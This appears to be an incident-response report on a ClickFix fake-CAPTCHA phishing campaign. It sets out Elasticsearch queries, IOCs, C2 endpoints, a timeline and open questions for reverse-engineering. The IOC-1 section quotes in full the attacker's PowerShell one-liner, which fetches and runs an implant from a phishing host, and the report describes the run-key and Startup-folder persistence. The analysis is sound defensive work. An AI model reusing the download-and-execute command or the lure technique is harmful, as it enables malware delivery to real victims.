# Elasticsearch Incident Response Findings

## Summary

A targeted **ClickFix / FakeCaptcha** social-engineering campaign against
employees at Kongsberg Gruppen and Airbus delivered a custom Windows implant
named `updater.exe` (SHA256
`254601603f918d20338739b1eb4cb15bd31525aa5bcc2520c0432bb055603d7d`).

- **Compromised hosts**: `anders-desktop` (10.3.10.21, user `anders`) — full
  compromise; `john-desktop` (10.3.10.22, user `john`) — implant ran briefly
  then terminated.
- **Initial access**: Phishing site `f1leshare.net` (10.3.124.26) served a
  fake Fortinet "shared file" page → fake CAPTCHA page that instructs the
  victim to press Win+R and paste a PowerShell one-liner that downloads and
  executes `updater.exe`.
- **C2 infrastructure** (two channels, both HTTP/80, custom encoded
  payloads):
  - `MiccosoftUpdate.com` (10.3.97.182) — `/api/info`, `/api/data`
    (registration + telemetry/exfil pipe)
  - `windowsupdater.tk` (10.3.215.83) — `/windows/checkforupdate` (beacon
    polling, returns encrypted commands), `/update/servicedata` (large
    encrypted result/exfil channel)
- **Persistence (anders-desktop)**: `HKCU\...\Run\MicrosoftUpdater` →
  `C:\Users\anders\AppData\Local\Microsoft\updater.exe`, plus Startup-folder
  copy `...\Startup\msteamsupdater.exe`.
- **Discovery / collection**: `cmd.exe /c dir` on `C:\Users`, Documents,
  Desktop; `cmd.exe /c type "C:\Users\anders\Desktop\polen.eml"` (read an
  email file) — all spawned by `updater.exe`.
- **Exfiltration**: A 1944-byte encrypted POST to
  `windowsupdater.tk/update/servicedata` at 17:51:51 UTC immediately follows
  the file-read commands and is the primary candidate for the exfiltrated
  `polen.eml` content. All exfil bodies are wrapped in a custom encryption
  scheme (the bare cleartext is **not** recoverable without reversing
  `updater.exe`).

## Indices reviewed

| Index pattern | Purpose |
|---|---|
| `.internal.alerts-security.alerts-default-000001` | 31 detection-engine alerts (entry point) |
| `.ds-logs-endpoint.events.process-*` | Elastic Defend process telemetry |
| `.ds-logs-endpoint.events.network-*` | Elastic Defend network telemetry |
| `.ds-logs-endpoint.events.file-*` | Elastic Defend file events |
| `.ds-logs-endpoint.events.registry-*` | Elastic Defend registry events |
| `.ds-logs-windows.sysmon_operational-*` | Sysmon (process hashes, DNS, net) |
| `.ds-logs-network_traffic.http-*` | Packetbeat HTTP request/response bodies |
| `.ds-logs-network_traffic.dns-*` | Packetbeat DNS queries |
| `.ds-logs-network_traffic.tls-*`, `.flow-*` | Cross-checked, no relevant TLS C2 |
| `.ds-logs-system.security-*`, `.ds-logs-windows.powershell-*` | Reviewed, nothing additional |

Hosts producing telemetry: `anders-desktop`, `john-desktop`, `emil-desktop`
(no compromise indicators on emil — only normal Microsoft delivery
optimization and Edge traffic).

---

## IOCs

### IOC-1 — Phishing infrastructure: `f1leshare.net` (10.3.124.26)

**Description**: Threat-actor-controlled web server hosting a Fortinet-branded
"file access" page and a fake CAPTCHA page that pushes a PowerShell payload
via the **ClickFix** technique (T1204.004 / T1059.001).

**Query**:
```json
GET .ds-logs-network_traffic.http-*/_search
{ "query": { "bool": { "should": [
    { "wildcard": { "url.full": "*f1leshare*" }},
    { "wildcard": { "destination.domain": "*f1leshare*" }} ] }},
  "sort": [{ "@timestamp": "asc" }] }
```

**Raw evidence**:
- Landing URLs (per victim, with attacker-chosen lures):
  - `http://f1leshare.net/?file=kongsberggrupper-insider&share=nordnet.no`
    (anders-desktop, 17:46:32 UTC)
  - `http://f1leshare.net/?file=norway-buys-80-jets&share=reddit.com`
    (john-desktop, 17:47:03 UTC)
- Form posts user email to `/captcha?email=anders%40kongsberg.com&q=Fortinet%2Fabh4whnesdgbw07f%2FImportant+Download` and `email=john%40airbus.com`.
- The CAPTCHA HTML body contains hidden JS that builds and copies to
  clipboard the exact PowerShell command:

```
powershell -exec bypass -windowstyle hidden -command
  "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
   IWR -Uri 'http://f1leshare.net/download/updater'
       -OutFile $env:TEMP\updater.exe -UseBasicParsing;
   & $env:TEMP\updater.exe"
```

- `GET http://f1leshare.net/download/updater` requested with User-Agent
  `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.169`
  — anders-desktop at 17:47:07.104, john-desktop at 17:49:07.369. HTTP 200,
  binary returned.

**Why suspicious**: Typo-squat domain ("f1leshare" with a one), embedded
clipboard-payload trick, PowerShell with `bypass`/hidden window/cert-validation
disabled, victim-specific lure parameters indicating reconnaissance prior to
the attack.

---

### IOC-2 — Malicious binary `updater.exe`

**Description**: Custom Windows implant dropped by the PowerShell stager.

**Query**:
```esql
FROM logs-windows.sysmon_operational-*
| WHERE process.name == "updater.exe"
| KEEP @timestamp, host.name, process.hash.sha256, process.hash.md5,
       file.path, process.command_line
```

**Raw evidence (Sysmon EID 1 process creation)**:

| Field | Value |
|---|---|
| SHA256 | `254601603f918d20338739b1eb4cb15bd31525aa5bcc2520c0432bb055603d7d` |
| MD5 | `0af1b6721ed62e0ac9144cc5b456dc78` |
| Size | 88,576 bytes |
| Drop path | `C:\Users\<user>\AppData\Local\Temp\updater.exe` (created by powershell.exe) |
| Persistence copy 1 | `C:\Users\anders\AppData\Local\Microsoft\updater.exe` |
| Persistence copy 2 | `C:\Users\anders\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe` (88,576 bytes — identical) |
| Parent process | `powershell.exe` |

On `john-desktop` Sysmon recorded `updater.exe` Process Creation at
17:49:12.488 immediately followed by Process Terminated at 17:49:12.700
(EID 5). No persistence, discovery, or C2 traffic was observed from
john-desktop after that — likely crashed or detected an unsuitable
environment.

**Why suspicious**: Unsigned PE in user-writable temp path, started by
hidden PowerShell, immediately spawns network connections to two
non-standard domains and writes itself to two persistence locations.

---

### IOC-3 — Persistence

**Description**: Run-key + Startup folder.

**Query**:
```esql
FROM logs-endpoint.events.registry-*
| WHERE registry.path LIKE "*Run*" OR registry.path LIKE "*Startup*"
```

**Raw evidence**:
- Registry write at 2026-03-29T17:47:21.479Z:
  - `HKEY_USERS\S-1-5-21-2720038117-2954272070-1833396500-1002\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater`
    = `C:\Users\anders\AppData\Local\Microsoft\updater.exe`
  - Process: `updater.exe`, user `anders`.
- File creation at 2026-03-29T17:47:21.471Z:
  - `C:\Users\anders\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe`
- ATT&CK: T1547.001 (Registry Run Key) + T1547.001 (Startup Folder).

---

### IOC-4 — C2 channel A: `MiccosoftUpdate.com` (10.3.97.182)

**Description**: Initial victim registration + ongoing data POSTs. First
request is plaintext host fingerprint; everything after is
binary/base64-style encoded.

**Query**:
```json
GET .ds-logs-network_traffic.http-*/_search
{ "query": { "term": { "destination.domain": "MiccosoftUpdate.com" } } }
```

**Raw evidence**:
- 2026-03-29T17:47:19.669Z `POST http://MiccosoftUpdate.com/api/info`
  body (cleartext):
  ```
  Host: ANDERS-DESKTOP
  User: anders
  Arch: x64
  CPUs: 4
  RAM: 8185 MB
  ```
  Response: `{"status":"ok"}`
- Subsequent POSTs to `/api/data` carry base64-style ciphertext, e.g.:
  - 108-byte `ARoJrzWVL26gH6JkZPvbjR8f/JXr+BEV2DYhNDI5mC2A...` (repeats — likely a fixed beacon)
  - 44-byte `Aft8mr3RJ6zjFR66w+mTbjPVEvZzp4/vdYDYr99GtQFK` (heartbeat)
  - 172-byte `AVj+t0qXdFqhK/Jyr6+dYZpjBTQwRDEVSY85ZQENiEGd...`
  - 364-byte `AUZeHlsmI5Pcj5jef7mCEz/+DbQYamj4SBVVsZrg...` at 17:47:19.884
  - 556-byte payload at 17:52:40 (largest on this channel)
- User-Agent on all requests: `Mozilla/5.0` (no version — non-browser).

**Why suspicious**: Typo-squat domain ("Miccosoft"), first POST leaks
host/user/specs, all subsequent data is encrypted, fixed UA
`Mozilla/5.0`, regular short-interval beacons.

---

### IOC-5 — C2 channel B: `windowsupdater.tk` (10.3.215.83)

**Description**: Command-polling and large-payload exfil channel.

**Query**:
```json
GET .ds-logs-network_traffic.http-*/_search
{ "query": { "term": { "destination.domain": "windowsupdater.tk" } } }
```

**Raw evidence**:
- Beacon: `POST http://windowsupdater.tk/windows/checkforupdate`
  body always `Host: ANDERS-DESKTOP\r\n`. When the operator queues a task
  the response carries an encrypted command, e.g.:
  - 17:48:20.010 → `{"command":"Q52aB5TFVA5uEM/IeZ0Kyg==","encrypted":"True","status":"ok"}`
  - 17:49:20.346 → `{"command":"ISL6QPPTKg2tMQgQfCRu10uFvjw0koh/MudkA/oUS98=","encrypted":"True","status":"ok"}`
  - 17:50:50.567 → `{"command":"ISL6QPPTKg2tMQgQfCRu134S+r4B5p6X4HZo/X4d/vs=","encrypted":"True","status":"ok"}`
  - 17:51:50.695 → `{"command":"A45yK3lKmkrMpH01AxtchDAHsYTB95vlGUdgdYR6EekutR6WwKdtMbvDbfUfwsKt","encrypted":"True","status":"ok"}`
- Result/exfil: `POST http://windowsupdater.tk/update/servicedata` carries
  the large encrypted bodies (see IOC-6).

**Why suspicious**: `.tk` domain, plaintext server response explicitly says
`"encrypted":"True"`, beacon-then-result pattern is classic C2.

---

### IOC-6 — Discovery and email collection (T1083, T1005)

**Query**:
```esql
FROM logs-endpoint.events.process-*
| WHERE process.parent.name == "updater.exe"
| KEEP @timestamp, host.name, user.name, process.command_line
```

**Raw evidence (anders-desktop, parent `updater.exe`)**:

| Time (UTC) | Command line |
|---|---|
| 17:48:22.628 | `cmd.exe /c dir "C:\Users"` |
| 17:49:22.963 | `cmd.exe /c dir "C:\Users\anders\Documents"` |
| 17:50:53.185 | `cmd.exe /c dir "C:\Users\anders\Desktop"` |
| 17:51:53.313 | `cmd.exe /c type "C:\Users\anders\Desktop\polen.eml"` |

`john-desktop` produced no child processes from `updater.exe` (the implant
terminated immediately).

**Why suspicious**: The implant programmatically enumerates user
directories then `type`s an email file (`polen.eml` — likely a saved
Outlook .eml message) to its stdout. The very next outbound POST contains
a 1944-byte encrypted payload (see IOC-7). ATT&CK T1083 + T1005.

---

### IOC-7 — Exfiltration of `polen.eml` (probable) (T1041)

**Description**: Largest single C2 POST observed, sent ~−2 s of (and
following the burst of) the `cmd.exe /c type polen.eml` command. The
operator pre-tasked the implant via the 17:51:50 beacon command
`A45yK3lKmkrMpH01AxtchDAHsYTB95vlGUdgdYR6EekutR6WwKdtMbvDbfUfwsKt`
(decrypted, this almost certainly contains the `type polen.eml`
instruction; the *result* was uploaded ~0.5 s later).

**Query**:
```json
GET .ds-logs-network_traffic.http-*/_search
{ "query": { "bool": { "must": [
    { "term": { "http.request.method": "POST" } },
    { "range": { "http.request.body.bytes": { "gte": 500 } } } ] } },
  "sort": [{ "http.request.body.bytes": "desc" }] }
```

**Raw evidence — 2026-03-29T17:51:51.101Z, host anders-desktop,
`POST http://windowsupdater.tk/update/servicedata`, body 1944 bytes**:

```
A7it1Mht0/eBAGAKD7BCx1pdNGKSC7LgWUfhDHU9IVnR2nytjgZZKKLAaqLLhOwLqTCg
06/uVhU7nsMPdEz3vnpenGS56yua1aRlW5w2kSTsY+ik6z1Zwuxv6x0bYGXlfmkQQVqf
olRqtjZF8r/VyaN62xSp1+d3blUZuKIwGq2RHEIExwnh2IBtc/6NB4SJFg2MGngv8l56
r2qfzuZ9dNP0rfv+SNJD53nBTEs7lQcEHuVlkczLk3GrpZZce3A7Yq+eHaQyX/DGBNSg
7QVLf9gXc9pSUGXONFhbS8r5HANe5tUHENCPGJ5DV7PsPQUv9fszZERiweljc9iHwNuE
plk59LONW4T7aXAtf3o8Qk0w8KY0wPDL3MQJQ0FGgoyfn78hHWbeHY8BxqvHadv6Zhk2
q2aPw8koQcKAVn2lh5dU/dDlYQjSH9dAAjmIB2+DqrJmTQS8oCT7t7YGNEU3tDJgRPCT
KPFy/Nd0DbGRhiBMQ1ZuR65eTEjuRxKr3YVaW8RAVCsLa2bmVf3AyihsNZj+S25wp4qG
hENRfMJB41DIZGHzl4KqWznMD4RDKxMe6hXrbYUUCTq6GCPGOvqNauj9gAXTi4xy6C5S
b63Lcpre+CwQ0x4nLGlMbKvM0HVfgN9dB0mfJW0by+S5tKv5gJ6fg1rmzK/agDyYBtuX
PFhjnFmokwyI5XYD3WB5HMiM5ne4Lh2E1QVJtaFuFzYqv/Zhcv+hZ0xPbWhs540G9Myk
4iApX1MhnB87VGQsmPU8XbaaQywjuT5XNUxYgLNFcWK8IRbYPhK5k1URECwF9M//nfRI
HVoCnO5PIINcou8V22KtMm3JTBjMg8Js0kB28ptLew/+503K9QVxfEU1MH1TA/nO2Yt1
IAWqjdkJSwWrySwftl4kw+W+F79oNdLzTD4ZIVu65tXGARhl+TRVQ6VRXSXUvC4kleBe
0YhXBe85z7NkKggoSurVDGkGp9QSYB1vbEzHhQIAtZ4ENWTHEm2UphJDr58XTJUBTM2x
g5SKX+kEgJuc6ijWsrxEzNHhfSU2kVeSk0+0jkrkVNNYVsAfDRduWgWyTAdxIOthPAYf
EsctO3fsfvnZQ7tNoIpIPIzFpII2KLqRKpTtVKkMuaHNpYfrjxcr1ITQ45XEdXxPJ8dL
dV9bmncnfo7BdhpqJrSad6JKefdwIYJWLaL5hvuhnnsQg6acqqUOPiUGBa9qqS1ZJ1bb
YeFKiDQkRJHjeom1ylixMoqcb5KoteuxnLOk2EcDuaM7NSQoswizBqAEkV7NoawnlRJ9
0lxnWNv3Sn0dvF44gZqHqpPvlXFBKuPBr+wLc3nKVvR1EbvsJ+2DMjNOrq+J/3mAsmme
X/d/RNsGrNfAvOPgu7L4EzWl8FL2a3mH0qxI8C7SHKSr8s+1Pmz1MN46oMFnBfuDx+mf
3dwskIKkeYxLH0wDdEuSHBMJLL7CKkAMDvtyjz7zIiiOC8zJQqmfJHne3agRU2cCmKP1
WmtTzo6T08OHoHH5U46YgKIm2Xv4aNAmw/IF+/AK5HT485soS6b+4jiap0LUXEdMy55i
awXsROuiVhB6GofOtzdwZJGMmLFBOPDI7hXtrybK2Q550MPa3gbfoTF1twd5gT3Lcn/e
mCI5H7+uAwZnUUQcUc4mhkhUskfy61KZSMqFURUUggCGrAevZV5GLupJ0uOwadfXyqq1
0lY63OJcEE94kg+SOvuxufrK/Qwrk3HJwyjdyyj2RLPiahQQSR4GcXIqU1lfcispcRyn
I3acMbYH7vaXXcqQjW/yIsmOOZRajzKgjw0rJSJOvUqqo51gqk+XgrGXUjQdpqiZQx7Q
bkFNGjLR3lIfhD+Z5K123XOSNn4ZNq+hjK+CULTFuN3zLAZ4jFQQIPRAToSjU6HKmjF8
wWDnKuk1t0L1EYQarjLzBuvZdQ7D3ZXpVvTysco=
```

This blob is **encrypted** (server response confirms `"encrypted":"True"`
on the matching command). The cleartext is **not recoverable from
network telemetry alone** — see Gaps.

Other large exfil POSTs (anders-desktop → `windowsupdater.tk/update/servicedata`):
- 17:48:20.302 — 516 bytes (initial discovery result)
- 17:50:50.656 — 536 bytes
- 17:52:40.387 — 556 bytes (to MiccosoftUpdate.com `/api/data`)

---

## Timeline

| Time (UTC, 2026-03-29) | Host | User | Event | Evidence index |
|---|---|---|---|---|
| 17:46:30 | anders-desktop | anders | DNS A `f1leshare.net` | network_traffic.dns |
| 17:46:32.447 | anders-desktop | anders | GET `f1leshare.net/?file=kongsberggrupper-insider&share=nordnet.no` (Edge) | network_traffic.http |
| 17:46:41.808 | anders-desktop | anders | GET `f1leshare.net/captcha?email=anders%40kongsberg.com` (clickfix payload served) | network_traffic.http |
| 17:46:55.976 | anders-desktop | anders | RunMRU registry write — PowerShell ClickFix command pasted into Win+R | endpoint.events.registry |
| 17:47:07.104 | anders-desktop | anders | PowerShell `IWR` GET `f1leshare.net/download/updater` (UA WindowsPowerShell/5.1) | network_traffic.http |
| 17:47:11.586 | anders-desktop | anders | File create `C:\Users\anders\AppData\Local\Temp\updater.exe` (88576 B) by powershell.exe | endpoint.events.file |
| 17:47:19.669 | anders-desktop | anders | C2 registration `POST MiccosoftUpdate.com/api/info` (host fingerprint cleartext) | network_traffic.http |
| 17:47:20.142 | anders-desktop | anders | Process create `updater.exe` SHA256 `25460160…` MD5 `0af1b67…` (parent powershell) | sysmon (EID 1) |
| 17:47:20.577 | anders-desktop | anders | Persistence copy → `AppData\Local\Microsoft\updater.exe` | sysmon EID 11 |
| 17:47:21.471 | anders-desktop | anders | Persistence copy → Startup folder `msteamsupdater.exe` | sysmon EID 11 |
| 17:47:21.479 | anders-desktop | anders | Run-key set `HKCU\...\Run\MicrosoftUpdater` | endpoint.events.registry |
| 17:47:22.268 | anders-desktop | anders | DNS query `miccosoftupdate.com` from updater.exe | sysmon EID 22 |
| 17:47:52.310 | anders-desktop | anders | DNS query `windowsupdater.tk` from updater.exe | sysmon EID 22 |
| 17:48:20.010 | anders-desktop | anders | First C2 command received (encrypted) on `windowsupdater.tk/windows/checkforupdate` | network_traffic.http |
| 17:48:22.628 | anders-desktop | anders | `cmd.exe /c dir "C:\Users"` (parent updater.exe) | endpoint.events.process |
| 17:48:20.302 | anders-desktop | anders | First exfil POST 516 B → `windowsupdater.tk/update/servicedata` | network_traffic.http |
| 17:49:09.876 | john-desktop | john | File create `C:\Users\john\AppData\Local\Temp\updater.exe` | endpoint.events.file |
| 17:49:12.488 | john-desktop | john | Process create `updater.exe` (same hash) | sysmon EID 1 |
| 17:49:12.700 | john-desktop | john | `updater.exe` terminated (EID 5) — implant dies on this host | sysmon EID 5 |
| 17:49:22.963 | anders-desktop | anders | `cmd.exe /c dir "C:\Users\anders\Documents"` | endpoint.events.process |
| 17:50:53.185 | anders-desktop | anders | `cmd.exe /c dir "C:\Users\anders\Desktop"` | endpoint.events.process |
| 17:51:50.695 | anders-desktop | anders | C2 sends 48-B encrypted command (likely "type polen.eml") | network_traffic.http |
| 17:51:51.101 | anders-desktop | anders | **1944-byte encrypted exfil POST → `windowsupdater.tk/update/servicedata`** | network_traffic.http |
| 17:51:53.313 | anders-desktop | anders | `cmd.exe /c type "C:\Users\anders\Desktop\polen.eml"` recorded by EDR | endpoint.events.process |
| 17:52:40.387 | anders-desktop | anders | 556-B encrypted POST → `MiccosoftUpdate.com/api/data` (further exfil) | network_traffic.http |

(Beaconing on both channels continues every ~30 s after this; 53 HTTP
docs total to the two C2 domains across the visible window.)

---

## Exfiltrated data

The likely-exfiltrated content is **`C:\Users\anders\Desktop\polen.eml`**
(an Outlook-exported email message — filename, location and the explicit
`cmd /c type` make this the most probable target).

The **raw cleartext is not recoverable from Elasticsearch alone**: every
exfil POST body is wrapped in the implant's custom encryption (the C2
server explicitly returns `"encrypted":"True"`). The verbatim ciphertext
of the largest single exfil event is preserved in IOC-7 above.

Cleartext data we *did* recover:
- Host fingerprint POSTed in `/api/info`:
  `Host: ANDERS-DESKTOP\nUser: anders\nArch: x64\nCPUs: 4\nRAM: 8185 MB\n`
- Phishing form input emails: `anders@kongsberg.com`, `john@airbus.com`.

---

## Gaps / Open questions for Ghidra

1. **Encryption / encoding scheme** used by `updater.exe` for both the
   `/api/data` and `/update/servicedata` payloads, and for the `command`
   field in beacon responses. Decrypting any of these requires the
   key/algorithm baked into the binary. SHA256
   `254601603f918d20338739b1eb4cb15bd31525aa5bcc2520c0432bb055603d7d`,
   88,576 bytes — this is the file to reverse. The dropped copies share
   the same hash.
2. **Static C2 strings** — confirm the two domains
   (`MiccosoftUpdate.com`, `windowsupdater.tk`) and the URL paths
   (`/api/info`, `/api/data`, `/windows/checkforupdate`,
   `/update/servicedata`) are hard-coded vs. fetched. Look for any
   secondary domains/IPs not yet observed.
3. **Command set** — the `command` field returned by the C2 (sample
   ciphertexts in IOC-5) likely encodes shell commands. After Ghidra
   recovers the cipher, the four observed commands should be decrypted
   to reconstruct the operator's exact actions.
4. **Decrypt the 1944-byte payload** at 17:51:51.101 to confirm whether
   it is the contents of `polen.eml` and recover the actual email body.
5. **Crash on john-desktop** — `updater.exe` terminated 0.2 s after
   start. Check the binary for environment / domain / username checks
   that would abort execution (anti-analysis or victim-targeting
   logic).
6. **Why two C2 domains?** Determine whether `MiccosoftUpdate.com` and
   `windowsupdater.tk` serve different roles in code (e.g., one for
   telemetry/heartbeat, one for tasking) or are simple failover.
